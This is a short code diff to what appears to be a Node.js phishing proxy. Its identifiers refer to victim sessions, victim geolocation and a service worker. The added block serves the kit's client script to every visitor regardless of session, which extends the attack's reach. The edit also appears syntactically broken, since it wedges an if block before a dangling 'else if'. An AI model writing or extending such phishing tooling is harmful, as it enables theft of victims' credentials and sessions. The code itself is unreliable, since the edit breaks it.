@@ -296,7 +296,15 @@ getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
             fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
         }
     }
-
+     // ---- Serve the client script regardless of session ----
+if (url.split('?')[0] === PROXY_PATHNAMES.script) {
+    clientResponse.writeHead(200, {
+        "Content-Type": "application/javascript",
+        "Cache-Control": "no-cache, no-store, must-revalidate"
+    });
+    fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
+    return;
+}
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
             clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
